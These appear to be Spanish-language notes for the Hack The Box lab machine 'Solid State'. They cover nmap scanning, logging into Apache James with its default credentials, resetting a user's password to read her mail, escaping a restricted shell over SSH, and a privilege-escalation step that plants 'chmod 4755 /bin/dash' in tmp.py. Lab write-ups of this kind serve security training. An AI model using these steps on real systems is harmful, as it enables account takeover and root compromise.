# Solid State

IP: 10.10.10.51

## Ping y TTL

`ping -c 1 10.10.10.51`

`whichSystem.py 10.10.10.51`

## Escaneo de puertos 

`nmap -p- --open -T5 -v -n 10.10.10.51 -oN allPorts`

Vemos el 80 abierto --> investigamos web  
- wappalyzer
- CTRL + U
- 10.10.10.51/webadmin /admin /administrador
- Formulario contacto --> CTRL + U --> buscamos method 

`nmap -sC -sV -p22,25,80,110,119,4555 10.10.10.51 -oN targetedPorts`

`searchsploit james remote`

`searchsploit apache james remote`

Probamos por telnet el puerto 25 SMTP

`telnet 10.10.10.51 25` 
- HELLO solidstate
- HELP
- VRFY root

Nos conectamos al admin 4555

`telnet 10.10.10.51 4555`

Buscamos en google las credenciales por defecto de James y vemos:

root/root

`help`
- listusers
- setpassword
- adduser

`setpassword mindy 1234`

`telnet 10.10.10.51 110`
- USER mindy 
- PASS 1234
- list
- RETR 1
- RETR 2

## Nos conectamos por SSH con las credenciales

`ssh mindy@10.10.10.51`

`whoami` --> restricted bash

`echo $SHELL`

`export`

`echo $PATH`

`exit`

## Usamos bash desde SSH
~~~
ssh mindy@10.10.10.51 whoami
ssh mindy@10.10.10.51 "echo \$SHELL"
ssh mindy@10.10.10.51 bash
sh
whereis python
python -c 'import pty; pty.spawn("/bin/bash")'
export SHELL=bash
~~~

Modificamos tmp.py

os.system('chmod 4755 /bin/dash')



